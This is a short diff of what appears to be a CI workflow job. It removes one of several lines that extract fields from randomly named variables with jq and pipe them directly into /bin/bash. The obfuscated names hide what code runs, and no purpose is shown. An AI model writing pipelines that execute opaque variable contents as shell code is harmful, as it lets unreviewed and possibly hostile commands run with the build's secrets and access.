@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$yo79" | jq -r .dh8704 | /bin/bash
           echo $fx177 | jq -r .tvvzt598 | /bin/bash
           printf '%s' "$ugoi26988" | jq -r .mmhdr2 | /bin/bash
-          echo $ayx66864 | jq -r .mtdr06 | /bin/bash
           echo $tah6245 | jq -r .udh6 | /bin/bash
 
       - name: Archive data
